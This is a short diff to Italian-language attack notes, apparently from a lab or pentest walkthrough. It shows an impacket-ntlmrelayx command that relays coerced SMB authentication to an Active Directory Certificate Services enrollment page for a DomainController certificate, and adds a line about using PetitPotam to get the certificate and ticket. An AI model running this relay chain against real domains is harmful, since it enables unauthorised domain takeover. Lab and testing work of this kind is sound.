@@ -208,3 +208,4 @@ Avvia un listener che reinderizzi il login smb a http
 ```bash
 impacket-ntlmrelayx -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
 ```
+Usa petitpoam per ottenere il certificato tgt
